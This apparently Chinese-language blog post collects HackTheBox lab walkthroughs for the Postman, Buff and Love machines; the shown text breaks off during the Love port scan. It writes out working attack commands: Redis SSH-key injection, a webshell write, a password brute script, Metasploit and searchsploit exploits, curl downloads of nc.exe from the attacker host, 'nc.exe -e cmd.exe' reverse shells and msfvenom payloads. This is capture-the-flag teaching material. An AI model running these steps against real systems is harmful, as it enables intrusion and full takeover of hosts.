<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">
<meta name="referrer" content="no-referrer" />
  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_icon.svg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_icon.svg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_icon.svg">
  <link rel="mask-icon" href="/images/logo_icon.svg" color="#222">
  <link rel="manifest" href="/images/logo_icon.svg">
  <meta name="msapplication-config" content="/images/logo_icon.svg">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=consolas:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoloyolo.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="HackTheBox合集">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox_All_In_One">
<meta property="og:url" content="https://yoloyolo.top/2023/04/02/HackTheBox-All-In-One/index.html">
<meta property="og:site_name" content="xXxYOLOxXx">
<meta property="og:description" content="HackTheBox合集">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/00.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/01.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/02.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/03.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/04.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/05.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/06.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/07.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/08.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/09.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/10.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/11.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/12.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/13.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/14.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/15.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/16.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/17.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/18.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/19.png">
<meta property="og:image" content="https://yoloyolo.top/images/hackthebox_buff/20.png">
<meta property="article:published_time" content="2023-04-02T11:31:08.000Z">
<meta property="article:modified_time" content="2023-04-02T11:41:54.340Z">
<meta property="article:author" content="xXxYOLOxXx">
<meta property="article:tag" content="Pentest">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://yoloyolo.top/images/hackthebox_buff/00.png">

<link rel="canonical" href="https://yoloyolo.top/2023/04/02/HackTheBox-All-In-One/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>HackTheBox_All_In_One | xXxYOLOxXx</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="xXxYOLOxXx" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">xXxYOLOxXx</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">xXxYOLOxXx</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="links fa-fw"></i>Links</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://yoloyolo.top/2023/04/02/HackTheBox-All-In-One/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="xXxYOLOxXx">
      <meta itemprop="description" content="Explorer for unknown.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xXxYOLOxXx">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HackTheBox_All_In_One
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-02 19:31:08 / Modified: 19:41:54" itemprop="dateCreated datePublished" datetime="2023-04-02T19:31:08+08:00">2023-04-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>HackTheBox合集</p>
<a id="more"></a>
<h1 id="hackthebox_postman"><a class="markdownIt-Anchor" href="#hackthebox_postman"></a> HackTheBox_Postman</h1>
<p><code>2020/01/15 19:55:48</code></p>
<h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2>
<h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3>
<p><code>nmap -sV -Pn -p 1-10000 -T5 -n -v -A 10.10.10.160</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.160</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 9326 closed ports, 672 filtered ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">6379/tcp  open  redis   Redis key-value store 4.0.9</span><br><span class="line">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: MiniServ/1.910</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html; Charset=iso-8859-1).</span></span><br><span class="line"><span class="string">Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Android 4.1.1 (92%), Android 4.1.2 (92%), Android 4.2.2 (Linux 3.4) (92%)</span></span><br><span class="line"><span class="string">No exact OS matches for host (test conditions non-ideal).</span></span><br></pre></td></tr></table></figure>
<h3 id="web路径枚举"><a class="markdownIt-Anchor" href="#web路径枚举"></a> Web路径枚举</h3>
<p>尝试爆破80端口下的Web路径<br />
未发现有效信息</p>
<h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2>
<p>尝试直接登入redis服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.10.10.160</span><br></pre></td></tr></table></figure>
<p>利用redis未授权写入ssh密钥，再用ssh登入redis账户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rm -rf ~/.ssh/id*</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>;cat ~/.ssh/id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; new.txt</span><br><span class="line">redis-cli -h 10.10.10.160 flushall</span><br><span class="line">cat new.txt | redis-cli -h 10.10.10.160 -x <span class="built_in">set</span> crackit</span><br><span class="line">redis-cli -h 10.10.10.160 config <span class="built_in">set</span> dir /var/lib/redis/.ssh/</span><br><span class="line">redis-cli -h 10.10.10.160 config <span class="built_in">set</span> dbfilename <span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">redis-cli -h 10.10.10.160 save</span><br><span class="line">ssh -i /root/.ssh/id_rsa redis@10.10.10.160</span><br></pre></td></tr></table></figure>
<p>无法在<code>/var/www/html/</code>目录下写入WebShell</p>
<p>发现文件<code>/opt/id_rsa.bak</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -l /opt</span><br><span class="line"></span><br><span class="line">total 4</span><br><span class="line">-rwxr-xr-x 1 Matt Matt 1743 Aug 26 00:11 id_rsa.bak</span><br></pre></td></tr></table></figure>
<p>可以确定是Matt账户的ssh密钥</p>
<p>拷贝到本地之后再用脚本转为john可以破解的密码形式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/john/ssh2john.py id_rsa.bak &gt; ssh</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt ssh</span><br><span class="line">    computer2008</span><br></pre></td></tr></table></figure>
<p>得到Matt账户的口令，使用SSH登入Matt账户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh Matt@10.10.10.160</span><br><span class="line">computer2008</span><br></pre></td></tr></table></figure>
<h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2>
<p>在MSF中搜索Webmin的相关漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">search webmin</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                         Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                         ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary&#x2F;admin&#x2F;webmin&#x2F;edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access</span><br><span class="line">   1  auxiliary&#x2F;admin&#x2F;webmin&#x2F;file_disclosure       2006-06-30       normal     No     Webmin File Disclosure</span><br><span class="line">   2  exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution</span><br><span class="line">   3  exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_backdoor          2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor</span><br><span class="line">   4  exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin &#x2F;file&#x2F;show.cgi Remote Command Execution</span><br><span class="line">   5  exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE</span><br></pre></td></tr></table></figure>
<p>MSF中调用漏洞利用工具</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce</span><br><span class="line">set payload cmd&#x2F;unix&#x2F;reverse_netcat</span><br><span class="line">set LHOST 10.10.16.14</span><br><span class="line">set RHOSTS 10.10.10.160</span><br><span class="line">set USERNAME Matt</span><br><span class="line">set PASSWORD computer2008</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>获取root权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
<hr />
<p>Redis登入之后，可以考虑写入一句话后门/phpinfo这个思路</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/www/html/</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> webshell <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<p>而这台靶机中无法在<code>/var/www/html/</code>目录下写入文件，提权也比较困难，只能写入SSH密钥</p>
<p>附：<br />
Redis弱口令探测脚本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-  coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">PASSWORD_DIC=[<span class="string">&#x27;redis&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;oracle&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;p@aaw0rd&#x27;</span>,<span class="string">&#x27;abc123!&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">ip, port, timeout</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">        s.send(<span class="string">&quot;INFO\r\n&quot;</span>)</span><br><span class="line">        result = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;redis_version&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">u&quot;未授权访问&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;Authentication&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> pass_ <span class="keyword">in</span> PASSWORD_DIC:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">                s.send(<span class="string">&quot;AUTH %s\r\n&quot;</span> %(pass_))</span><br><span class="line">                result = s.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;+OK&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">u&quot;存在弱口令，密码：%s&quot;</span> % (pass_)</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">    port=sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="built_in">print</span> check(ip,port, timeout=<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<hr />
<p>nmap扫描速度巨慢，而且总是会扫漏几个端口，甚至扫全端口时总是会中途因为900s的数据包延迟而中断扫描…(体验极差)</p>
<p>Redis的操作完全没有接触过，十分生疏</p>
<p>Webmin的漏洞利用倒是异常的顺利</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9548962.html">redis</a><br />
<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/xF8GsjumqZhGe2Ue2XppGw">wp</a></p>
</blockquote>
<hr />
<h1 id="hackthebox_buff"><a class="markdownIt-Anchor" href="#hackthebox_buff"></a> HackTheBox_Buff</h1>
<p><code>2020/07/27 16:23:58</code></p>
<h2 id="前期工作"><a class="markdownIt-Anchor" href="#前期工作"></a> 前期工作</h2>
<p>连接服务器，服务器连接代理</p>
<p><img src="/images/hackthebox_buff/00.png" alt="" /></p>
<p>网络状态</p>
<p><img src="/images/hackthebox_buff/01.png" alt="" /></p>
<p>靶机</p>
<p><img src="/images/hackthebox_buff/02.png" alt="" /></p>
<p><img src="/images/hackthebox_buff/03.png" alt="" /></p>
<h2 id="信息收集-2"><a class="markdownIt-Anchor" href="#信息收集-2"></a> 信息收集</h2>
<h3 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h3>
<p><code>nmap -sT -Pn --top-port 1000 -sV -T5 10.10.10.198</code></p>
<p><img src="/images/hackthebox_buff/04.png" alt="" /></p>
<h3 id="web路径扫描"><a class="markdownIt-Anchor" href="#web路径扫描"></a> Web路径扫描</h3>
<p><code>gobuster dir -w /usr/share/wordlists/directory-list-2.3-medium.txt -x .php -u http://10.10.10.198:8080/</code></p>
<p><img src="/images/hackthebox_buff/05.png" alt="" /></p>
<h2 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h2>
<p>代理浏览器</p>
<p><code>proxychains firefox</code></p>
<p>得到CMS相关信息</p>
<p><img src="/images/hackthebox_buff/06.png" alt="" /></p>
<p>搜索相关漏洞<br />
<code>searchsploit Gym 1.0</code></p>
<p><img src="/images/hackthebox_buff/07.png" alt="" /></p>
<p>执行EXP<br />
<code>proxychains python 48506.py http://10.10.10.198:8080/</code></p>
<p><img src="/images/hackthebox_buff/08.png" alt="" /></p>
<p>获取Shell</p>
<p><img src="/images/hackthebox_buff/09.png" alt="" /></p>
<h2 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h2>
<p>服务器开启HTTP服务<br />
<code>pythom -m SimpleHTTPServer 9900</code></p>
<p><img src="/images/hackthebox_buff/10.png" alt="" /></p>
<p>下载nc与plink</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://10.10.16.4:9900/nc.exe</span><br><span class="line">curl -O http://10.10.16.4:9900/plink.exe</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox_buff/11.png" alt="" /></p>
<p>使用nc反弹shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9999</span><br><span class="line">nc.exe -e cmd.exe 10.10.16.4 9999</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox_buff/12.png" alt="" /></p>
<p>后台进程中发现CloudMe<br />
<code>tasklist | findstr CloudMe</code></p>
<p><img src="/images/hackthebox_buff/13.png" alt="" /></p>
<p>该进程在本地开启了8888端口<br />
<code>netstat -ano | findstr 2556</code></p>
<p><img src="/images/hackthebox_buff/14.png" alt="" /></p>
<p>使用plink进行端口转发<br />
<code>plink.exe -R 9901:127.0.0.1:8888 root@10.10.16.4 -pw YOUR_PASSWORD</code></p>
<p><img src="/images/hackthebox_buff/15.png" alt="" /></p>
<p>查看服务器端口<br />
<code>netstat -antlp | grep 9901</code></p>
<p><img src="/images/hackthebox_buff/16.png" alt="" /></p>
<p>搜索相关漏洞<br />
<code>searchsploit cloudme</code></p>
<p><img src="/images/hackthebox_buff/17.png" alt="" /></p>
<p>使用EXP <a target="_blank" rel="noopener" href="http://44470.py">44470.py</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 44470.py</span><br><span class="line">cat 44470.py</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox_buff/18.png" alt="" /></p>
<p>使用msfvenom构造payload<br />
<code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f c</code></p>
<p>修改payload，且修改端口为9901之后上传EXP至服务器<br />
<code>scp 44470.py root@hk:/root/</code></p>
<p>监听端口4444<br />
<code>nc -lvnp 4444</code></p>
<p>执行EXP<br />
<code>python 44470.py</code></p>
<p>提权成功</p>
<p><img src="/images/hackthebox_buff/19.png" alt="" /></p>
<p>查看flag</p>
<p><img src="/images/hackthebox_buff/20.png" alt="" /></p>
<hr />
<h1 id="hackthebox_love"><a class="markdownIt-Anchor" href="#hackthebox_love"></a> HackTheBox_love</h1>
<h2 id="端口扫描-3"><a class="markdownIt-Anchor" href="#端口扫描-3"></a> 端口扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.239</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.239</span><br><span class="line">Host is up (0.87s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3306-TCP:V=7.91%I=7%D=6/9%Time=60C04557%P=x86_64-pc-linux-gnu%r(NUL</span><br><span class="line">SF:L,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed</span></span><br><span class="line"><span class="string">SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(GenericLines,4</span><br><span class="line">SF:9,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x2</span></span><br><span class="line"><span class="string">SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(HTTPOptions,49,<span class="string">&quot;E</span></span><br><span class="line"><span class="string">SF:\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\</span></span><br><span class="line"><span class="string">SF:x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(RPCCheck,49,<span class="string">&quot;E\0\0\x0</span></span><br><span class="line"><span class="string">SF:1\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20conn</span></span><br><span class="line"><span class="string">SF:ect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(DNSStatusRequestTCP,49,<span class="string">&quot;E\0\</span></span><br><span class="line"><span class="string">SF:0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20</span></span><br><span class="line"><span 